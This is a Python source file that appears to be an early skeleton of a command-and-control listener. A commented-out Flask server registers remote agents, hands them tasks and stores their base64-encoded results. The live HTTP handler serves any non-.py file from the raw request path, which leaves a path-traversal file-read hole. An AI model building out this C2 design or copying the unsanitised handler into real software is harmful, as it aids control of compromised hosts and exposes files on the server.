#!/usr/bin/env python3 
from flask import *
from multiprocessing import Process 
import time
from base64 import b64encode, b64decode 
from http.server import BaseHTTPRequestHandler
import os

#Subprocess Will be implemented to spawn a background proccess passing a listener script to
#Python interpreter

class Listener(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        try:
            split_path = os.path.splitext(self.path)
            request_extension = split_path[1]
            if request_extension != ".py":
                f = open(self.path[1:]).read()
                self.send_response(200)
                self.end_headers()
                self.wfile.write(bytes(f, 'utf-8'))
            else:
                f = "File not found"
                self.send_error(404,f)
        except:
            f = "hala Wallah"
            self.send_error(404,f)


'''
class Listener:  
    def __init__(self, port=7000): 
        self.port = port
        self.listener = Flask(__name__)
        #self.process = Process(target=self.listener.run, kwargs= {'port': self.port, 'host': '0.0.0.0' }) 

        @self.listener.route('/reg/<id>', methods = ['GET'])
        async def register(id):  
            #Extract Agent ID, registered agents will be handled by their ID 
            agentID = id
            #timeout = request.args.post['timeout']  
            agentIP = request.remote_addr  
            db.registerAgent(agentID, agentIP)
            #Return a value of 1 to inform agent for successfull registration  
            return 'Success'
        
        @self.listener.route('/task/<id>', methods = ['GET'])
        async def task(id): 
            task = db.checkTask(id)
            return task 
        
        @self.listener.route('/task/results/<id>', methods= ['POST'])           
        async def results(id): 
            if (request.form.get('results')): 
                with open('results/%s' % id, 'a+') as r: 
                    #Add timestamp
                    r.write(b64decode(request.form.get('results')).decode() + '\n')
                db.clearTask(id)     
                return "results received"    
            else: 
                return "No results provided" 

        @self.listener.route('/fin/<id>', methods= ['GET']) 
        async def fin(id):  
            db.deleteAgent(id)
    
        @self.listener.route('/') 
        #Testing putposes route
        async def test(): 
            return "FLASK ALIVE!"
        
        
        
    def runListener(self):
        #self.listener.run(port=self.port, host= '0.0.0.0')
        return self.listener
''' 
             
